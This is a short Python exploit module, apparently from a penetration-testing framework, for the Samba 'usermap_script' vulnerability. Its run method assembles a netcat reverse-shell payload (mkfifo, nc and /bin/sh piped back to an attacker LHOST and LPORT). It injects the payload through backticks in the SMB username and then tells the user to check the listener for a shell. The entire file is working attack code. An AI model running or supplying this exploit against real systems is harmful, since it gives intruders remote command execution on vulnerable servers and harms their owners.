from .internal.base import Exploit

class SambaUsermapScript(Exploit):
    def __init__(self):
        super().__init__()
        self.info["Credits To"] = "https://github.com/amriunix"
        self.prompt = "usermap_script % "

        self.pip_dependencies = ["pysmb"]

        self.args = {
            "RHOST":
                { "description": "Remote host",
                  "required": True },
            "RPORT":
                { "description": "Remote port",
                  "required": True },
            "LHOST":
                { "description": "Local host",
                  "required": True },
            "LPORT":
                { "description": "Local port",
                  "required": True }
        }

        for arg in self.args.keys():
            self.__dict__[arg] = "N/a"

    def run(self):
        from smb.SMBConnection import SMBConnection
        payload = "mkfifo /tmp/hago; nc " 
        payload += self.LHOST + ' ' + self.LPORT
        payload += " 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago"
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(self.RHOST, int(self.RPORT), timeout=1)
        except:
            print("[**]::payload sent...")
            print("[!!]::check your reverse tcp listener for a shell...")
